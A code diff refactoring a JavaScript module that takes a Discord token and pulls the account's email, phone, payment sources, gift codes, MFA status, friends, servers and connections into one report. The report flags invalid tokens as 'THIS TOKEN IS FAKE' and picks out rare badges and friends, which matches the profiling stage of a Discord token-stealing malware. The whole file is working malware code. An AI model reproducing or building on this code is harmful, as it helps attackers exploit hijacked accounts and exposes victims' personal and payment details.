@@ -102,7 +102,6 @@ let getGuilds = (n) => {
   };
 };
 
-
 let rareFriend = (r) => {
   let ñ = "";
   r.filter((_) => _.type === 1).forEach((n) => {
@@ -152,65 +151,68 @@ let getNitroPremium = (u) => {
 
 let getDate = (a, b) => new Date(a).setMonth(a.getMonth() + b);
 
-let getDiscordInfo = (token) => {
-  const user = getDiscordApi("https://discord.com/api/v9/users/@me", token);
-  const profile = getDiscordApi(`https://discord.com/api/v9/users/${Buffer.from(token.split(".")[0], 'base64').toString('binary')}/profile`, token);
-  if (user === "Invalid") return {
-    all: "THIS TOKEN IS FAKE",
-    guilds: "THIS TOKEN IS FAKE",
-    friends: "THIS TOKEN IS FAKE"
-  }
-  const settings = getDiscordApi("https://discord.com/api/v9/users/@me/settings", token);
-  const paymentSources = getDiscordApi("https://discord.com/api/v9/users/@me/billing/payment-sources", token);
-  const relationships = getDiscordApi("https://discordapp.com/api/v9/users/@me/relationships", token);
-  const guilds = getDiscordApi("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token);
-  const applications = getDiscordApi("https://discord.com/api/v9/applications", token);
-  const connections = getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token);
-  const entitlements = getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token);
-  
+module.exports = (token) => {
   let p = "";
-  paymentSources?.forEach(s => {
-    p += s.brand && s.invalid === 0 ? emojis.user.payments[0] : "";
-    p += s.email ? emojis.user.payments[1] : "";
-  });
-
-  const info = {
-    token: token,
-    ID: user.id,
-    globalName: `${user.global_name}`,
-    avatarDecoration: `${user.avatar_decoration_data ? user.avatar_decoration_data : "Avatar-Decoration Not Found"}`,
-    username: `${user.username}#${user.discriminator}`,
-    badges: AllBadges(user.flags),
-    nitroType: getNitroPremium(profile),
-    avatar: user.avatar ? getImage(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`) : "Avatar Not Found",
-    banner: user.banner ? getImage(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`) : "Banner Not Found",
-    totalFriend: relationships.filter((b) => b.type === 1).length,
-    totalBlocked: relationships.filter((a) => a.type === 2).length,
-    pending: relationships.filter((r) => r.type === 3).length,
-    NitroGifts: entitlements[0] ? entitlements.map((g) => `${g}, `).join("") : "Nitro Gifts-Codes Not Found",
-    totalOwnedGuild: guilds.filter((g) => g.owner).length,
-    totalApplication: applications.length,
-    totalConnection: connections.length,
-    totalGuild: guilds.length,
-    NSFW: user.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
-    MFA2: user.mfa_enabled ? "✅ `Allowed`" : "❌ `Not allowed`",
-    verified: user.verified ? "✅" : "❌",
-    bio: user.bio || "Bio Not Found",
-    phone: user.phone || "Phone Not Found",
-    mail: user.email,
-    billing: p ? p : "Not Found",
-    langue: getLanguage(settings.locale),
-    status: getStatusEmoji(settings.status),
-    theme: getTheme(settings.theme),
-    gifts: getGiftsCodes(token, settings),
-  }, guildsInfo = {
-    all: getGuilds(guilds).all,
-    rares: getGuilds(guilds).rare,
-  }, friendsInfo = {
-    all: "Unfinished",
-    rares: rareFriend(relationships),
-  };
-  return { all: info, guilds: guildsInfo, friends: friendsInfo }
+  let g = "";
+  const user = getDiscordApi("https://discord.com/api/v9/users/@me", token),
+    profile = getDiscordApi(`https://discord.com/api/v9/users/${Buffer.from(token.split(".")[0], 'base64').toString('binary')}/profile`, token);
+  if (user === "Invalid")
+    return ({ all: "THIS TOKEN IS FAKE", guilds: "THIS TOKEN IS FAKE", friends: "THIS TOKEN IS FAKE" })
+  const settings = getDiscordApi("https://discord.com/api/v9/users/@me/settings", token),
+    payment = getDiscordApi("https://discord.com/api/v9/users/@me/billing/payment-sources", token),
+    relationships = getDiscordApi("https://discordapp.com/api/v9/users/@me/relationships", token),
+    guilds = getDiscordApi("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token),
+    applications = getDiscordApi("https://discord.com/api/v9/applications", token),
+    connections = getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token),
+    entitlements = getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token);
+  payment?.forEach((s) => {
+    s.brand && 0 == s.invalid && (
+      p += emojis.user.payments[0]
+    ), s.email && (
+      p += emojis.user.payments[1]
+    );
+  }), p || (p = "Billing Not Found");
+  return (
+    entitlements[0]
+      ? entitlements?.forEach((s) => (
+        g += `${s}, `
+      )) : (g = "Nitro Gifts-Codes Not Found"),
+    {
+      all: {
+        token: token,
+        ID: user.id,
+        globalName: `${user.global_name}`,
+        avatarDecoration: `${user.avatar_decoration_data ? user.avatar_decoration_data : "Avatar-Decoration Not Found"}`,
+        username: `${user.username}#${user.discriminator}`,
+        badges: AllBadges(user.flags),
+        nitroType: getNitroPremium(profile),
+        avatar: user.avatar ? getImage(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`) : "Avatar Not Found",
+        banner: user.banner ? getImage(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`) : "Banner Not Found",
+        totalFriend: relationships.filter((b) => b.type === 1).length,
+        totalBlocked: relationships.filter((a) => a.type === 2).length,
+        pending: relationships.filter((r) => r.type === 3).length,
+        NitroGifts: g,
+        totalOwnedGuild: guilds.filter((g) => g.owner).length,
+        totalApplication: applications.length,
+        totalConnection: connections.length,
+        totalGuild: guilds.length,
+        NSFW: user.nsfw_allowed ? "🔞 `Allowed`" : "❌ `Not allowed`",
+        MFA2: user.mfa_enabled ? "✅ `Allowed`" : "❌ `Not allowed`",
+        verified: user.verified ? "✅" : "❌",
+        bio: user.bio || "Bio Not Found",
+        phone: user.phone || "Phone Not Found",
+        mail: user.email,
+        billing: p,
+        langue: getLanguage(settings.locale),
+        status: getStatusEmoji(settings.status),
+        theme: getTheme(settings.theme),
+        gifts: getGiftsCodes(token, settings),
+      }, guilds: {
+        all: getGuilds(guilds).all,
+        rares: getGuilds(guilds).rare,
+      }, friends: {
+        all: "Unfinished",
+        rares: rareFriend(relationships),
+      }
+    })
 }
-
-module.exports = getDiscordInfo
